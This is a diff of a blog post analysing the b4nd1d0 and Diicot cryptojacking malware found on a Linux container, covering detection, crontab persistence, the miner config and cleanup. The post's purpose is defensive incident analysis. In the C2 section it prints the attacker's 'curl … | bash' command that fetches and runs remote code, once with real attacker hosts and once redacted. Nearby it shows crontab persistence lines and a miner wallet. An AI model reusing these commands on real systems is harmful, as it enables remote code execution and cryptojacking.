@@ -1,6 +1,6 @@
 ---
 layout: post
-title: a beginer's analysis of .b4nd1d0 and .diicot
+title: a beginner's analysis to b4nd1d0 and diicot malware.
 date: 2024-09-29 16:10:00
 description: How b4nd1d0 and diicot malwares works on a linux container
 tags: malware
@@ -20,7 +20,7 @@ The perfect recipe for a disaster.
 
 ### Detection
 
-The detection of this attack was done by an automatic mail signaling abnormal traffic directed to some Linux machines via SSH, with a lot of errors returned by theese machines.
+The detection of this attack was done by an automatic mail signaling abnormal traffic directed to some Linux machines via SSH, with a lot of errors returned by these machines.
 
 The logs were like this:
 ```
@@ -40,7 +40,11 @@ The attacker was probably another
 
 ### Securing the foothold
 
-The foothold was secured by using a chron script:
+The foothold was secured by using some chrontab script:
+
+The b4ndid0 script was responsable for launching a cryptominer.
+At every restart the diicot script was running.
+Every 30 second the c script queries a website for new command. 
 
 ```
 crontab -l
@@ -55,14 +59,16 @@ crontab -l
 */30 * * * * /var/tmp/Documents/./.c > /dev/null 2>&1 & disown
 ```
 
-Using disown ... job -l was empty
+Using disown jobs -l was empty
 
 ### Scope of the attack
 
+### [diicot](https://www.cadosecurity.com/blog/tracking-diicot-an-emerging-romanian-threat-actor)
+Diicot, formerly [Mexals](https://www.bitdefender.co.uk/blog/labs/how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign/), is a cryptojacking campaigns that targets insicure linux distributions. It relies on Shell Script Compiler for obfuscate his presence.
 
 
 ### b4nd1d0
-
+b4nd1d0 launch the Opera process responable for mining the crypto.
 ```
 #!/bin/bash
 m1lbe1()
@@ -79,15 +85,16 @@ m1lbe1
 
 ```
 
-### diicot
 
 ### c
 
+Used for receiving command remotely
 ```
-curl -s 91.92.250.6/.x/black3 --connect-timeout 15 | bash >/dev/null 2>&1 || curl -s x.diicot.xyz/.x/black3 --connect-timeout 15 | bash >/dev/null 2>&1
+curl -s evil_pub_ip/.x/black3 --connect-timeout 15 | bash >/dev/null 2>&1 || curl -s diicot.xyz/.x/black3 --connect-timeout 15 | bash >/dev/null 2>&1
 ```
 
 ### config.yaml
+Configuration for the miner.
 
 ```
 admin@machine:/# cat /var/tmp/Documents/config.json 
@@ -101,7 +108,7 @@ admin@machine:/# cat /var/tmp/Documents/config.json
         {
             "algo": null,
             "coin": null,
-            "url": "139.99.123.196:80",
+            "url": "BadUrl:80",
             "user": "87Fxj6UDiwYchWbn2k1mCZJxRxBC5TkLJQoP9EJ4E9V843Z9ySeKYi165Gfc2KjxZnKdxCkz7GKrvXkHE11bvBhD9dbMgQe",
             "pass": "proxy2",
             "rig-id": "",
@@ -118,4 +125,12 @@ admin@machine:/# cat /var/tmp/Documents/config.json
 
 ```
 
-### Obfuscation
+### recover
+
+- Remove all from crontab 
+- Delete the /tmp/Documents folder
+- Stop new services
+  
+
+### Learning points:
+USE SECURE PASSWORDS
